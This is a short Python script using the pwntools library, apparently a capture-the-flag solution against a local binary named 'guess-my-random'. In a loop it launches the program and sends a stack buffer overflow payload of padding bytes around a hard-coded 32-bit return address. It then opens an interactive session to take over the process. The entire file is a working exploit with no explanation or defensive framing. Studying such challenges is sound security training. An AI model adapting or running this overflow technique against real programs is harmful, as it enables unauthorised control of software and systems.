#!/usr/bin/env python
from pwn import *
while True:
        p = process('./guess-my-random')
        p.recv()
        buf = 'A'*27
        buf += p32(0x804863b)
        buf += 'A'*41
        p.sendline(buf)
        p.interactive()
        p.close()
